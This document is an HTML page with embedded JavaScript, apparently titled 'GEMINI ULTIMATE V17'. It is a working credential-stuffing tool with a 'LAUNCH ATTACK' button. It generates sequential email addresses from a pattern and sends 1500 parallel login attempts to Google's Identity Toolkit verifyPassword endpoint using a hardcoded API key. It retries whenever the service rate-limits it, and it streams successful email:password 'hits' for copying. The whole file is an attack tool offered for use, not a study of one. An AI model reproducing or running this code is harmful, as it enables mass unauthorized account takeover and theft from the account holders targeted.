<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>GEMINI ULTIMATE V17</title>
    <style>
        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; margin: 0; padding: 15px; }
        .wrapper { max-width: 650px; margin: auto; border: 2px solid #00ffcc; background: #050505; padding: 25px; box-shadow: 0 0 50px #00ffcc66; border-radius: 20px; }
        h1 { font-size: 28px; color: #00ffcc; text-shadow: 0 0 15px #00ffcc; margin-bottom: 5px; }
        
        .input-row { display: flex; gap: 10px; margin-bottom: 12px; }
        input { flex: 1; padding: 15px; background: #111; border: 1px solid #333; color: #fff; border-radius: 10px; text-align: center; outline: none; font-size: 16px; transition: 0.3s; }
        input:focus { border-color: #00ffcc; box-shadow: 0 0 10px #00ffcc; }
        
        .btn-launch { width: 100%; padding: 22px; background: linear-gradient(90deg, #00ffcc, #0099ff); color: #000; border: none; font-weight: bold; font-size: 22px; cursor: pointer; border-radius: 12px; text-transform: uppercase; margin-bottom: 15px; }
        .btn-copy { width: 100%; padding: 15px; background: #222; color: #00ffcc; border: 1px solid #00ffcc; font-weight: bold; cursor: pointer; border-radius: 10px; margin-bottom: 15px; }
        .btn-copy:hover { background: #00ffcc; color: #000; }

        .dash { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
        .card { background: #0a0a0a; padding: 15px; border: 1px solid #222; border-radius: 12px; }
        .card b { font-size: 35px; color: #00ffcc; display: block; }
        
        #status-bar { background: #111; color: #ffeb3b; padding: 10px; border-radius: 8px; font-weight: bold; margin-bottom: 15px; border: 1px dashed #ffeb3b; }
        #res-box { width: 100%; height: 350px; background: #000; color: #0f0; border: 1px solid #0f0; padding: 15px; font-size: 14px; border-radius: 10px; resize: none; overflow-y: scroll; box-sizing: border-box; }
    </style>
</head>
<body>

<div class="wrapper">
    <h1>GEMINI ULTIMATE</h1>
    <p style="color:#777; font-size: 12px; margin-bottom: 20px;">MAX SPEED | ZERO SKIP | AUTO-COPY</p>
    
    <div id="status-bar">🚀 ENGINE STATUS: READY</div>

    <div class="input-row">
        <input type="number" id="start" placeholder="START NUMBER">
        <input type="number" id="end" placeholder="END NUMBER">
    </div>
    
    <input type="text" id="fmt" style="width:100%; margin-bottom:12px; box-sizing:border-box;" placeholder="FORMAT: USER_{6}_@GMAIL.COM">
    <input type="text" id="pwd" style="width:100%; margin-bottom:12px; box-sizing:border-box;" placeholder="PASSWORD">
    
    <button class="btn-launch" id="startBtn" onclick="ignite()">🔥 LAUNCH ATTACK</button>
    <button class="btn-copy" onclick="copyResults()">📋 COPY ALL HITS</button>

    <div class="dash">
        <div class="card"><span>CHECKED (1,2,3..)</span><b id="c">0</b></div>
        <div class="card"><span>FOUND HITS</span><b id="f">0</b></div>
    </div>

    <textarea id="res-box" readonly placeholder="Hits will stream here in perfect order..."></textarea>
</div>

<script>
    let active = false;
    let checked = 0, found = 0;
    let head, index, limit;
    let storage = new Map();
    let uiBuffer = "";
    let startTime;
    const API_KEY = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";

    async function ignite() {
        if (active) { location.reload(); return; }

        let s = parseInt(document.getElementById('start').value);
        let e = parseInt(document.getElementById('end').value);
        let f = document.getElementById('fmt').value.toUpperCase().trim();
        let p = document.getElementById('pwd').value.trim();

        if (isNaN(s) || isNaN(e) || !f.includes('{')) return alert("Input values missing!");

        active = true;
        head = s; index = s; limit = e;
        startTime = Date.now();
        document.getElementById('startBtn').innerText = "🛑 EMERGENCY STOP";
        document.getElementById('startBtn').style.background = "#ff0055";

        // --- HIGH-SPEED WORKERS (1500 PARALLEL PIPES) ---
        for (let i = 0; i < 1500; i++) {
            (async function stream() {
                while (active && index <= limit) {
                    let cur = index++;
                    await check(f, p, cur);
                }
            })();
        }

        // --- UI REFRESH (300ms) ---
        setInterval(() => {
            if (!active) return;
            document.getElementById('c').innerText = checked;
            document.getElementById('f').innerText = found;
            let elapsed = (Date.now() - startTime) / 1000;
            let speed = Math.round(checked / elapsed);
            document.getElementById('status-bar').innerText = `🔥 SPEED: ${speed} REQ/S | WAITING FOR: ${head}`;

            if (uiBuffer !== "") {
                let box = document.getElementById('res-box');
                box.value += uiBuffer;
                box.scrollTop = box.scrollHeight;
                uiBuffer = "";
            }
        }, 300);
    }

    async function check(fmt, pwd, idx) {
        let digits = fmt.match(/\{(\d+)\}/)[1];
        let email = fmt.replace(/\{(\d+)\}/, idx.toString().padStart(digits, '0'));
        
        try {
            let r = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${API_KEY}`, {
                method: 'POST',
                body: JSON.stringify({ email: email, password: pwd, returnSecureToken: true }),
                headers: { 'Content-Type': 'application/json' }
            });

            if (r.status === 429) {
                await new Promise(res => setTimeout(res, 1200));
                return check(fmt, pwd, idx);
            }

            let d = await r.json();
            storage.set(idx, { ok: (d && d.idToken), mail: email });

            // --- ZERO-MISS SEQUENTIAL SYNC ---
            while (storage.has(head)) {
                let item = storage.get(head);
                if (item.ok) {
                    found++;
                    uiBuffer += item.mail + ":" + pwd + "\n";
                }
                checked++;
                storage.delete(head);
                head++;
            }
        } catch (e) {
            return check(fmt, pwd, idx);
        }
    }

    function copyResults() {
        let box = document.getElementById('res-box');
        box.select();
        document.execCommand('copy');
        alert("All Hits Copied!");
    }
</script>
</body>
</html>
